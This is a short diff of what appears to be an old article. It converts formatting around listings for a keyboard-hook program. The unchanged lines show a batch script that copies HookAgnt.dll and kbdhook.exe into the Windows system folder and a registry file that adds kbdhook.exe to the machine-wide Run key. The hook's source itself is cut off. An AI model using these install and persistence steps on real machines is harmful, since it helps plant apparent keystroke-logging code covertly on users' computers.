@@ -13,33 +13,21 @@ Date: 01.01.2007
 
  
 
-::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
-  --- -----------
-  ·   Setup.bat
-  --- -----------
-:::
+- Setup.bat
 
     @echo off
     copy HookAgnt.dll %windir%\system
     copy kbdhook.exe %windir%\system
     start HookAgnt.reg
 
-::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
-  --- --------------
-  ·   HookAgnt.reg
-  --- --------------
-:::
+- HookAgnt.reg
 
     REGEDIT4
      
     [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
     "kbdhook"="kbdhook.exe"
 
-::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
-  --- -------------
-  ·   KbdHook.dpr
-  --- -------------
-:::
+- KbdHook.dpr
 
     program cwbhook;
      
